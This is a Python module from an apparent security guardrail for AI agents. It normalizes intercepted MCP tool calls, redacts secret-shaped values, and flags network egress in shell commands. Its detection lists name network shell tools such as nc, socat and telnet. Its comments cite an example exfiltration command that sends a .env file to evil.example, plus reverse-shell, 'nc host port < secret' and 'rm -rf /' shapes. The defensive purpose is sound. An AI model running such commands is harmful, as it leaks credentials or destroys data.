"""Normalize raw MCP tool calls into immutable :class:`SecurityObject`\\ s.

The chokepoint hands every intercepted call to :func:`normalize` before the
decision point. Normalization must NEVER raise on weird input: on any
failure it produces a conservative object (``action_type=other``,
``risk=high``) so the engine fails toward caution, and it never copies raw
argument values into the object — values are redacted first.

The redaction here layers a length/shape stopgap with Feature 3's canonical
shared secret detector (``doberman.engine.rules.secrets.contains_strong_secret``)
so credential-shape knowledge lives in one place (H1 hardening) — the shared
detector's coverage (AWS/OpenAI/Anthropic/GitHub/GitLab/Slack/Google/Stripe/
SendGrid/npm/JWT/DB-URI/PEM/Azure/GCP/env-assignment) is added ON TOP OF the
original stopgap shapes, never instead of them: this call is raise-only, it
only ever redacts *more*, never less.
"""

import json
import os
import re
import uuid
from datetime import datetime, timezone
from typing import Any

from doberman.canonical import canonicalize
from doberman.engine.rules.commands import (
    _argv_from_tokens,
    command_line_from_arguments,
    walk_command,
)
from doberman.engine.rules.destinations import _parse_host
from doberman.engine.rules.secrets import candidate_secret_fingerprints, contains_strong_secret
from doberman.models import ActionType, ReasonCode, Risk, SecurityObject, SourceContext
from doberman.storage.fingerprint import fingerprint
from doberman.subjective.adapters import apply_adapters
from doberman.subjective.infer import infer_algebra, infer_reversibility

REDACTED = "<redacted>"

# Values longer than this are replaced wholesale — avoids logging huge blobs.
MAX_VALUE_LENGTH = 256

# Obvious secret shapes (original stopgap; kept as a floor — see
# `contains_strong_secret` below for the canonical, more complete detector):
# long unbroken token-ish strings, common key prefixes, key=value secrets.
_SECRET_SHAPES = re.compile(
    r"""
    (?:AKIA[0-9A-Z]{16})                              # AWS access key id
    | (?:sk-[A-Za-z0-9_\-]{16,})                      # api secret key prefix
    | (?:gh[pousr]_[A-Za-z0-9]{20,})                  # github tokens
    | (?:-----BEGIN[ A-Z]*PRIVATE\ KEY-----)          # PEM private key
    | (?:\b[A-Za-z0-9+/_\-]{40,}\b)                   # long unbroken token
    """,
    re.VERBOSE,
)

# Argument keys whose values are secret-ish regardless of shape.
_SENSITIVE_KEYS = re.compile(
    r"(?:pass(?:word)?|secret|token|api[_-]?key|credential|auth|bearer|private[_-]?key)",
    re.I,
)

# Don't bother shape-matching values shorter than the shortest secret shape.
_MIN_SECRET_LENGTH = 16

# Redaction recursion cap: anything nested deeper is redacted wholesale.
_MAX_REDACTION_DEPTH = 16

_TOOL_PREFIX_MAP: list[tuple[tuple[str, ...], ActionType]] = [
    (("fs_read", "file_read", "read_file"), ActionType.file_read),
    (("fs_write", "file_write", "write_file"), ActionType.file_write),
    (("fs_delete", "file_delete", "delete_file", "fs_rm"), ActionType.file_delete),
    (("shell_exec", "shell", "bash", "exec"), ActionType.shell_exec),
    (("net_", "http_", "fetch", "request"), ActionType.network_request),
    (("git_",), ActionType.git_op),
]

# Keys commonly carrying the action's target, in priority order.
_TARGET_KEYS = ("path", "file", "filename", "url", "command", "target")

# Arg keys whose value is an outbound recipient/address/channel, in priority
# order. Generic (matched by key shape, never tool name) so domain tools that
# normalize to ActionType.other still carry a destination for the trifecta /
# secret-exfil floors. Mirrors the benchmark adapter's _DEST_KEYS.
_EGRESS_DEST_KEYS: tuple[str, ...] = (
    "url",
    "recipient",
    "recipients",
    "to",
    "email",
    "address",
    "phone",
    "channel",
    "repo",
    "remote",
)

# Direct data-movement verbs. curl/wget/scp/sftp/rsync usually carry a
# URL/host; nc/ncat/netcat/ssh/telnet/ftp/tftp/socat are raw socket/shell
# channels (reverse shells, `nc host port < secret`, `ssh -R` tunnels) that
# rarely expose a URL-parseable host — so they reach AUTH via the
# zero-host -> egress_ambiguous path rather than a host-bearing verdict. Adding
# a verb here is strictly raise-only: it can only turn a previously-silent PASS
# into AUTH (or BLOCK when a secret is also present), never lower a verdict.
_DIRECT_EGRESS_VERBS = frozenset(
    {
        "curl",
        "ftp",
        "nc",
        "ncat",
        "netcat",
        "rsync",
        "scp",
        "sftp",
        "socat",
        "ssh",
        "telnet",
        "tftp",
        "wget",
    }
)
_GIT_EGRESS_SUBCOMMANDS = frozenset({"clone", "fetch", "pull", "push"})
_PACKAGE_EGRESS_VERBS = frozenset(
    {
        "bun",
        "cargo",
        "gem",
        "go",
        "npm",
        "pip",
        "pip3",
        "pipx",
        "pnpm",
        "poetry",
        "twine",
        "uv",
        "yarn",
    }
)
_PACKAGE_EGRESS_SUBCOMMANDS = frozenset(
    {
        "add",
        "download",
        "fetch",
        "install",
        "publish",
        "push",
        "sync",
        "update",
        "upload",
    }
)
#: ADR 0075 — package managers whose no-URL *fetch* forms route to a well-known
#: default registry; values are the canonical host that route implies. Only used
#: when a segment resolves ZERO explicit hosts and carries no redirect signal.
_PM_DEFAULT_REGISTRY: dict[str, str] = {
    "pip": "pypi.org",
    "pip3": "pypi.org",
    "pipx": "pypi.org",
    "uv": "pypi.org",
    "poetry": "pypi.org",
    "npm": "registry.npmjs.org",
    "pnpm": "registry.npmjs.org",
    "yarn": "registry.npmjs.org",
    "bun": "registry.npmjs.org",
    "cargo": "crates.io",
    "gem": "rubygems.org",
    "go": "proxy.golang.org",
}
#: Fetch-direction subcommands only. publish/push/upload send artifacts OUT and
#: never qualify for the implied-registry classification (ADR 0075).
_PM_FETCH_SUBCOMMANDS = frozenset({"add", "download", "fetch", "install", "sync", "update"})
#: pip-family flags whose value is a local file, so a dotted filename
#: (requirements.txt) must not be mistaken for a host. A URL value stays a route.
_REQUIREMENT_FILE_FLAGS = frozenset({"-r", "--requirement", "-c", "--constraint"})
#: Ambient env vars that redirect a package manager off its default registry.
#: ponytail: config-file redirects (~/.npmrc, pip.conf, project .npmrc) are
#: invisible to static parsing — the runtime egress broker is the upgrade path;
#: the secrets/taint/trifecta floors hold regardless of route.
_PM_REGISTRY_ENV_NAMES = frozenset(
    {"PIP_INDEX_URL", "PIP_EXTRA_INDEX_URL", "UV_INDEX_URL", "NPM_CONFIG_REGISTRY", "GOPROXY"}
)
#: N7 — HOME/XDG_CONFIG_HOME and the *_CONFIG_FILE/*_USERCONFIG vars relocate
#: which config file a package manager reads its registry from just as
#: directly as `sudo -H` does (C1), so an INLINE prefix (`HOME=/tmp pip
#: install ...`) must disqualify the implied-registry PASS the same way.
#: Deliberately a SEPARATE set from _PM_REGISTRY_ENV_NAMES above, used only by
#: _pm_route_redirect's inline-assignment scan: HOME (unlike PIP_INDEX_URL) is
#: ambiently set in essentially every real process, so folding it into
#: _ambient_registry_override's os.environ scan would AUTH every package
#: fetch everywhere, not just a command that explicitly overrides it.
_PM_INLINE_REGISTRY_ENV_NAMES = _PM_REGISTRY_ENV_NAMES | frozenset(
    {
        "HOME",
        "XDG_CONFIG_HOME",
        "PIP_CONFIG_FILE",
        "NPM_CONFIG_USERCONFIG",
        "NPM_CONFIG_GLOBALCONFIG",
        "UV_CONFIG_FILE",
    }
)
_PROXY_ENV_NAMES = frozenset({"HTTP_PROXY", "HTTPS_PROXY", "ALL_PROXY"})
_ROUTE_OVERRIDE_FLAGS = frozenset({"--connect-to", "--proxy", "--resolve", "-x"})
_ENV_ASSIGNMENT = re.compile(r"^(?P<name>[A-Za-z_][A-Za-z0-9_]*)=(?P<value>.*)$")
_DYNAMIC_EGRESS_TOKEN = re.compile(r"\$\(|`|\$(?:\{|[A-Za-z_])|[*]")
# Mirrors _DIRECT_EGRESS_VERBS (+ git/package verbs) for the unparseable /
# flag-taking-wrapper path. Word-boundary lookarounds keep each verb exact, so
# alternation order is not load-bearing (ssh-keygen, ncdu, sftp/tftp never match
# the bare ssh/nc/ftp); longest-first within a family is kept only for clarity.
_SUSPECTED_EGRESS_VERB = re.compile(
    r"(?<![A-Za-z0-9_.-])"
    r"(?:curl|wget|scp|sftp|rsync|netcat|ncat|nc|ssh|telnet|tftp|ftp|socat|"
    r"git|pip3?|pipx|npm|pnpm|yarn|bun|cargo|"
    r"gem|go|poetry|twine|uv)"
    r"(?![A-Za-z0-9_.-])",
    re.IGNORECASE,
)


def _map_action_type(tool_name: str) -> ActionType:
    name = tool_name.lower()
    # Host-namespaced MCP tools (``mcp__<server>__<tool>``, the shape Claude Code
    # passes through verbatim) are classified by the tool part: the server
    # prefix is routing, not a category, and must not hide a file/shell tool.
    if name.startswith("mcp__"):
        _server, _sep, tool_part = name[5:].partition("__")
        if tool_part:
            name = tool_part
    if "install" in name:
        return ActionType.package_install
    for prefixes, action_type in _TOOL_PREFIX_MAP:
        if name.startswith(prefixes):
            return action_type
    return ActionType.other


def _redact_value(key: str, value: Any, depth: int = 0) -> Any:
    """Redact a single argument value (never raises)."""
    if depth > _MAX_REDACTION_DEPTH:
        return REDACTED  # too deep to inspect — redact wholesale
    if isinstance(value, str):
        if _SENSITIVE_KEYS.search(key):
            return REDACTED
        if len(value) > MAX_VALUE_LENGTH:
            return REDACTED
        if len(value) >= _MIN_SECRET_LENGTH and _SECRET_SHAPES.search(value):
            return REDACTED
        # H1: layer the canonical shared detector (Azure/GCP/Stripe/JWT/DB-URI/
        # env-assignment/...) on top of the stopgap shapes above — a strict
        # superset of coverage, so this can only redact MORE, never less.
        if contains_strong_secret(value):
            return REDACTED
        return value
    if isinstance(value, list | tuple):
        return [_redact_value(key, item, depth + 1) for item in value]
    if isinstance(value, dict):
        return {str(k): _redact_value(str(k), v, depth + 1) for k, v in value.items()}
    if isinstance(value, bool | int | float) or value is None:
        return value
    return REDACTED  # unknown types never pass through raw


def _redact_args(arguments: dict[str, Any]) -> dict[str, Any]:
    return {str(key): _redact_value(str(key), value) for key, value in arguments.items()}


def _command_text(arguments: dict[str, Any]) -> str | None:
    return command_line_from_arguments(arguments)


def _command_name(token: str) -> str:
    return token.replace("\\", "/").rsplit("/", 1)[-1].lower()


def _command_verb(tokens: list[str]) -> tuple[str | None, list[str], bool]:
    """Return the visible executable + arguments without losing the input tokens.

    T5: shares ``_argv_from_tokens`` with the destructive-command rule (the
    allowed proxy -> engine import direction) so a flag-taking wrapper's own
    option (``sudo -u root``, ``timeout 5``, ...) is consumed instead of
    misread as the command — the wrapped command's egress verb/host is then
    recovered the same way a bare invocation's is.

    The third element (C1) is True when ``_argv_from_tokens`` consumed at
    least one wrapper OPTION (not just a bare wrapper name) to reach that
    verb — ``sudo -H``/``sudo -u <user>``/``nice -n 10`` change exactly the
    thing (HOME, acting uid) that decides which config file a package
    manager's default-route fetch actually resolves against, so the caller
    must not treat this segment as if the bare command had been typed.
    """
    consumed_option: list[bool] = []
    rest = _argv_from_tokens(tokens, consumed_any_option=consumed_option)
    wrapper_resolved = bool(consumed_option)
    if not rest:
        return None, [], wrapper_resolved
    return _command_name(rest[0]), rest[1:], wrapper_resolved


def _is_egress_verb(verb: str | None, arguments: list[str]) -> bool:
    if verb in _DIRECT_EGRESS_VERBS:
        return True
    if verb == "git":
        return any(
            _command_name(arg) in _GIT_EGRESS_SUBCOMMANDS
            for arg in arguments
            if not arg.startswith("-")
        )
    if verb in _PACKAGE_EGRESS_VERBS:
        return any(
            _command_name(arg) in _PACKAGE_EGRESS_SUBCOMMANDS
            for arg in arguments
            if not arg.startswith("-")
        )
    if verb in {"python", "python3", "py"} and len(arguments) >= 3:
        return (
            arguments[0] == "-m"
            and _command_name(arguments[1]) in {"pip", "pip3"}
            and _command_name(arguments[2]) in _PACKAGE_EGRESS_SUBCOMMANDS
        )
    return False


def _has_route_override(tokens: list[str]) -> bool:
    for token in tokens:
        assignment = _ENV_ASSIGNMENT.match(token)
        if assignment and assignment.group("name").upper() in _PROXY_ENV_NAMES:
            return True
        lowered = token.lower()
        if lowered in _ROUTE_OVERRIDE_FLAGS:
            return True
        if any(lowered.startswith(f"{flag}=") for flag in _ROUTE_OVERRIDE_FLAGS):
            return True
    return False


def _ambient_proxy_present() -> bool:
    return any(
        name.upper() in _PROXY_ENV_NAMES and bool(value) for name, value in os.environ.items()
    )


def _ambient_registry_override() -> bool:
    """An env-level registry redirect (PIP_INDEX_URL, NPM_CONFIG_REGISTRY, ...)
    means a package manager's "default" route is not the default registry."""
    return any(
        name.upper() in _PM_REGISTRY_ENV_NAMES and bool(value) for name, value in os.environ.items()
    )


def _implied_registry_fetch(verb: str | None, arguments: list[str]) -> str | None:
    """The default-registry host a recognized package-manager *fetch* implies,
    or ``None`` when the segment does not qualify (ADR 0075).

    Qualifies only when the verb has a known default registry and every
    package-subcommand present is fetch-direction (install/add/download/...).
    A publish/push/upload anywhere in the segment disqualifies it.
    """
    if verb in {"python", "python3", "py"} and len(arguments) >= 3 and arguments[0] == "-m":
        return _implied_registry_fetch(_command_name(arguments[1]), arguments[2:])
    host = _PM_DEFAULT_REGISTRY.get(verb or "")
    if host is None:
        return None
    subcommands = {
        _command_name(arg)
        for arg in arguments
        if not arg.startswith("-") and _command_name(arg) in _PACKAGE_EGRESS_SUBCOMMANDS
    }
    if not subcommands or not subcommands <= _PM_FETCH_SUBCOMMANDS:
        return None
    return host


def _pm_route_redirect(tokens: list[str]) -> bool:
    """True when any token could redirect a package manager off its default
    registry route. Covers the two shapes ``_candidate_hosts`` cannot see:
    inline env assignments (consumed by ``_command_verb``) and ``--flag=value``
    attached forms (skipped as flags)."""
    for token in tokens:
        assignment = _ENV_ASSIGNMENT.match(token)
        if assignment:
            if assignment.group(
                "name"
            ).upper() in _PM_INLINE_REGISTRY_ENV_NAMES and assignment.group("value"):
                return True
            continue
        if not token.startswith("-") or "=" not in token:
            continue
        flag, value = token.split("=", 1)
        if "://" in value:
            return True
        if flag in _REQUIREMENT_FILE_FLAGS:
            continue  # local-file value; the URL case is caught above
        if _looks_like_host_token(value):
            return True
    return False


def _strip_requirement_files(arguments: list[str]) -> list[str]:
    """Drop the local-file value of ``-r``/``--requirement``/``-c``/``--constraint``
    so a dotted filename (``requirements.txt``) is not mistaken for a host.
    A URL value (contains ``://``) is kept — the manager fetches it, so it IS a
    route and must surface as an explicit host."""
    out: list[str] = []
    skip = False
    for token in arguments:
        if skip:
            skip = False
            if "://" in token:
                out.append(token)
            continue
        if token in _REQUIREMENT_FILE_FLAGS:
            skip = True
        out.append(token)
    return out


def _looks_like_host_token(token: str) -> bool:
    if "://" in token or token.startswith("//"):
        return True
    if re.match(r"^(?:[^@/\s]+@)?(?:\[[^\]]+\]|[^:/\s]+\.[^:/\s]+)(?::|/|$)", token):
        return True
    return bool(re.match(r"^\d{1,3}(?:\.\d{1,3}){3}(?::|/|$)", token))


def _candidate_hosts(arguments: list[str]) -> tuple[list[str], bool, bool]:
    """Return visible hosts plus dynamic/credential signals from egress args."""
    hosts: list[str] = []
    dynamic = False
    had_credentials = False
    skip_route_value = False

    for token in arguments:
        lowered = token.lower()
        if skip_route_value:
            skip_route_value = False
            continue
        if lowered in _ROUTE_OVERRIDE_FLAGS:
            skip_route_value = True
            continue
        if any(lowered.startswith(f"{flag}=") for flag in _ROUTE_OVERRIDE_FLAGS):
            continue
        if token.startswith("-"):
            continue
        if _DYNAMIC_EGRESS_TOKEN.search(token):
            dynamic = True
            continue
        if not _looks_like_host_token(token):
            continue
        host, embedded_credentials, _is_mailbox = _parse_host(token)
        if host:
            hosts.append(host)
            had_credentials = had_credentials or embedded_credentials
    return hosts, dynamic, had_credentials


def _redact_host_label(label: str) -> str:
    """HMAC/redact one sensitive host label before it reaches the object."""
    prints = candidate_secret_fingerprints(label)
    # DNS labels are case-insensitive and `_parse_host` canonicalizes to lower
    # case. Check both case forms so that canonicalization cannot erase a
    # case-shaped credential signal such as an AWS access-key prefix.
    redacted = any(
        _redact_value("host_label", variant) == REDACTED for variant in (label, label.upper())
    )
    if not prints and not redacted:
        return label
    try:
        keyed = next(iter(prints)) if prints else fingerprint(label)
    except Exception:  # noqa: BLE001 — a key failure must redact, never expose
        return REDACTED
    digest = keyed.removeprefix("hmac:")
    return f"hmac-{digest[:32]}"


def _redact_host(host: str) -> str:
    return ".".join(_redact_host_label(label) for label in host.split("."))


def _suspected_egress_token(segments: list[list[str]]) -> bool:
    """True if any shlex-normalized token names a suspected egress tool.

    Matches the normalized tokens (not the raw command) so a quote-split verb
    (``cu''rl`` -> ``curl``) or a path-qualified one (``/usr/bin/curl`` ->
    ``curl``) is still caught, while an egress name that only appears *inside*
    another token (``--git-ref``) is not.
    """
    return any(
        _SUSPECTED_EGRESS_VERB.fullmatch(_command_name(token)) is not None
        for tokens in segments
        for token in tokens
    )


def _extract_command_egress(command: str) -> tuple[str | None, dict[str, Any]]:
    segments, parse_ambiguous, dynamic_walk = walk_command(command)
    hosts: list[str] = []
    implied_hosts: list[str] = []
    implied_only = True
    saw_egress = False
    dynamic_host = False
    had_credentials = False
    route_override = False
    unresolved_wrapper = False
    wrapper_resolved = False

    for tokens in segments:
        verb, arguments, resolved = _command_verb(tokens)
        wrapper_resolved = wrapper_resolved or resolved
        # T5: `_command_verb` now sees through a wrapper's own options, so a
        # leading `-` token only survives here in the one narrow case
        # `_argv_from_tokens` deliberately leaves unresolved (`env -S` whose
        # value can't be shlex-split) -- the real command is unidentified,
        # so fail upward rather than treat it as local.
        if verb is not None and verb.startswith("-"):
            unresolved_wrapper = True
            continue
        if not _is_egress_verb(verb, arguments):
            continue
        saw_egress = True
        route_override = route_override or _has_route_override(tokens)
        # ADR 0075: a recognized default-route package-manager fetch may imply
        # its registry host — but any redirect-capable token (attached
        # --flag=URL, inline registry env var) disqualifies the segment.
        implied = _implied_registry_fetch(verb, arguments)
        if implied is not None and not _pm_route_redirect(tokens):
            implied_hosts.append(implied)
            # Only for a qualifying fetch: -r/--constraint file values are local
            # paths, not hosts (a URL value survives the strip and stays a host).
            arguments = _strip_requirement_files(arguments)
        else:
            implied_only = False
        found, dynamic, embedded = _candidate_hosts(arguments)
        hosts.extend(found)
        dynamic_host = dynamic_host or dynamic
        had_credentials = had_credentials or embedded

    # A parse failure/cap or a flag-taking wrapper can hide the real command
    # before a suspected egress verb is classified. Surface ambiguity rather
    # than silently treating it as local. When shlex parsing succeeded (the
    # wrapper case) match the NORMALIZED tokens, so a quote-split (`cu''rl`) or
    # path-qualified (`/usr/bin/curl`) verb is still caught and an egress name
    # that only appears *inside* another token (`--git-ref`) is not; fall back
    # to the raw string only when parsing itself was unreliable.
    # ponytail: a bare egress name used purely as an argument (`grep curl x`)
    # still steps a wrapped command up to AUTH — a blunt fail-closed ceiling.
    # The precise fix is the deferred runtime egress broker, not a per-wrapper
    # flag-grammar parser: no clean heuristic exists (`sudo -u www-data` and
    # `nice -n 10` have different option arity).
    unresolved_suspected = not saw_egress and (
        (parse_ambiguous and _SUSPECTED_EGRESS_VERB.search(command) is not None)
        or (unresolved_wrapper and _suspected_egress_token(segments))
    )
    if not saw_egress and not unresolved_suspected:
        return None, {}

    unique_hosts = list(dict.fromkeys(hosts))
    # ADR 0075: every egress segment was a recognized default-route package
    # fetch, they all imply the same registry, no explicit host appeared
    # anywhere, and no ambiguity/redirect signal fired — surface the canonical
    # registry host with the implied marker instead of egress_ambiguous. The
    # destination rule PASSes this only in modes that already relax
    # destination-alone signals, and only for hosts on the trusted list.
    if (
        implied_only
        and not unresolved_suspected
        and not unique_hosts
        and len(set(implied_hosts)) == 1
        and not parse_ambiguous
        and not dynamic_host
        and not dynamic_walk
        and not route_override
        and not had_credentials
        and not wrapper_resolved
        and not _ambient_proxy_present()
        and not _ambient_registry_override()
    ):
        return _redact_host(implied_hosts[0]), {"egress_implied_registry": True}
    ambiguous = (
        parse_ambiguous
        or unresolved_suspected
        or dynamic_host
        or (dynamic_walk and saw_egress)
        or route_override
        or _ambient_proxy_present()
        or len(unique_hosts) != 1
    )
    destination = _redact_host(unique_hosts[0]) if unique_hosts else None
    metadata: dict[str, Any] = {}
    if ambiguous:
        metadata["egress_ambiguous"] = True
    if had_credentials:
        metadata["egress_embedded_credentials"] = True
    return destination, metadata


def _extract_egress_destination(
    redacted_args: dict[str, Any],
    raw_args: dict[str, Any],
) -> tuple[str | None, dict[str, Any]]:
    """Pick a redacted domain destination or classify raw command egress.

    Command-egress classification runs whenever the raw arguments compose a
    command line (``command``/``cmd``/``script``/``args``) — never gated on
    the tool's declared ``action_type``. The tool NAME is caller-supplied and
    not a trust boundary: a command-shaped payload under an unrecognized tool
    name (``helper {"command": "curl ... -d @.env https://evil.example"}``)
    must be classified the same as the same payload under ``shell_exec``.
    """
    command_meta: dict[str, Any] = {}
    command = _command_text(raw_args)
    if command is not None:
        dest, meta = _extract_command_egress(command)
        # A command that resolved a destination host wins outright.
        if dest is not None:
            return dest, meta
        # Raise-only: a command that parsed to NO host — whether it was
        # non-egress or a recognized egress verb with no parseable host
        # (e.g. `nc localhost 4444`, egress_ambiguous) — must NOT discard a
        # structured destination key (url/repo/remote/...) the fallback
        # below would surface. Otherwise {"command": "nc localhost 4444",
        # "url": <host>} drops the secret-exfil floor (BLOCK -> AUTH) and
        # ordinary dest-key egress (AUTH -> PASS). Carry any ambiguity
        # metadata onto whatever the fallback surfaces (raise-only: it can
        # only add an AUTH floor, never lower the surfaced host's verdict).
        command_meta = meta

    for key in _EGRESS_DEST_KEYS:
        value = redacted_args.get(key)
        if isinstance(value, str) and value:
            return value, command_meta
        if isinstance(value, list | tuple) and value:
            parts = [str(v) for v in value if isinstance(v, str) and v]
            if parts:
                return ",".join(parts), command_meta
    return None, command_meta


def _extract_target(action_type: ActionType, arguments: dict[str, Any]) -> tuple[str | None, dict]:
    """Pick a representative target; extra info (e.g. path counts) → metadata."""
    metadata: dict[str, Any] = {}
    for key in _TARGET_KEYS:
        value = arguments.get(key)
        if isinstance(value, str) and value:
            if key == "command" and value != REDACTED:
                # A split shape ({"command": "rm", "args": ["-rf", "/"]}) must
                # log the FULL composed line, not just the "command" key —
                # otherwise the logged target ("rm") disagrees with what the
                # command/destination rules actually scan ("rm -rf /"). Skip
                # composing when "command" itself was already wholesale-
                # redacted (long/secret-shaped): REDACTED must stay a clean
                # sentinel, never a partial composite.
                composed = command_line_from_arguments(arguments)
                if composed and len(composed) <= MAX_VALUE_LENGTH:
                    return composed, metadata
                # Oversized composite (a huge args list): keep the per-value
                # cap the redactor already enforces and log the head alone.
            return value, metadata
        if isinstance(value, list | tuple) and value:
            # Path arrays: representative first element + count in metadata.
            first = value[0]
            if isinstance(first, str):
                metadata["target_count"] = len(value)
                return first, metadata
    return None, metadata


def _action_fingerprint(
    action_type: ActionType,
    tool_name: str,
    raw_args: dict[str, Any],
    repo_root: object,
) -> str | None:
    """HMAC the exact unredacted action; retain none of its canonical input."""
    if not isinstance(repo_root, str) or not repo_root:
        return None
    try:
        command = _command_text(raw_args)
        raw_identity = command or json.dumps(raw_args, sort_keys=True, separators=(",", ":"))
        paths: list[str] = []
        if action_type in {ActionType.file_read, ActionType.file_write, ActionType.file_delete}:
            for key in _TARGET_KEYS:
                value = raw_args.get(key)
                values = value if isinstance(value, (list, tuple)) else [value]
                for item in values:
                    if isinstance(item, str) and item:
                        paths.append(canonicalize(item, root=repo_root).resolved)
        root = canonicalize(".", root=repo_root).resolved
        canonical = "\x1f".join(
            (action_type.value, tool_name, raw_identity, json.dumps(paths), root)
        )
        return fingerprint(canonical)
    except Exception:  # noqa: BLE001 - no key/odd payload means no memory
        return None


def normalize(
    tool_name: str,
    arguments: dict[str, Any] | None,
    context: dict[str, Any] | None = None,
) -> SecurityObject:
    """Turn one intercepted tool call into a SecurityObject. Never raises."""
    context = context or {}
    safe_tool_name = tool_name if isinstance(tool_name, str) else "<unknown>"
    try:
        args = dict(arguments or {})
        action_type = _map_action_type(tool_name)
        # Extract the target from the REDACTED args so target /
        # external_destination get exactly the same secret protections as
        # raw_args_redacted (a redacted value yields target="<redacted>").
        redacted_args = _redact_args(args)
        target, metadata = _extract_target(action_type, redacted_args)
        if action_type is ActionType.network_request:
            external_destination = target
        else:
            external_destination, egress_metadata = _extract_egress_destination(redacted_args, args)
            metadata.update(egress_metadata)
        base = SecurityObject(
            id=uuid.uuid4().hex,
            ts=datetime.now(timezone.utc),
            agent_role=str(context.get("agent_role", "unknown")),
            action_type=action_type,
            tool_name=safe_tool_name,
            target=target,
            external_destination=external_destination,
            source_context=SourceContext.unknown,
            raw_args_redacted=redacted_args,
            metadata=metadata,
            action_fingerprint=_action_fingerprint(
                action_type, safe_tool_name, args, context.get("repo_root")
            ),
        )
        # SL9: every normalized object carries a populated algebra — generic
        # inference first (reads the RAW args, which never enter the object),
        # then any registered refine-only adapters (clamped raise-only). An
        # inference failure leaves the conservative default algebra in place.
        algebra = apply_adapters(
            infer_algebra(base, args),
            {"tool_name": safe_tool_name, "arguments": args},
        )
        return base.model_copy(
            update={"algebra": algebra, "reversibility": infer_reversibility(base, args)}
        )
    except Exception:  # noqa: BLE001 — normalization must never break the path
        # Conservative fallback: unknown action at high risk, no argument
        # values copied at all (we cannot trust that redaction succeeded).
        return SecurityObject(
            id=uuid.uuid4().hex,
            ts=datetime.now(timezone.utc),
            agent_role="unknown",
            action_type=ActionType.other,
            tool_name=safe_tool_name,
            risk=Risk.high,
            source_context=SourceContext.unknown,
            metadata={"reason_codes": [ReasonCode.normalization_failed]},
        )
